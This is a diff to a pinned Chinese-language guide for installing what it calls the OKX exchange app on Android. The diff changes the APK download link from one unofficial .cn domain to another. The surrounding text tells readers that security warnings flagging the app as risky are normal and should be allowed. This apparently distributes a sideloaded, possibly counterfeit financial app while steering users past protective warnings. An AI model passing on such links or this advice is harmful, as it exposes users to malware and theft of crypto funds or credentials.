@@ -35,7 +35,7 @@ pin: true
 这里要区分下时电脑、苹果手机还是安卓手机。
 **安卓安装方法**
 
-[点击下载本地安卓apk文件](https://static.pyruas.cn/upgradeapp/okx-android.apk "download")
+[点击下载本地安卓apk文件](https://static.938w.cn/upgradeapp/okx-android.apk "download")
 
 下载完成后，点击安装就行，部分手机会识别为风险应用，会让你再三确认，或者需要让你打开纯净模式，都是正常提示，请大家允许就行了。
 
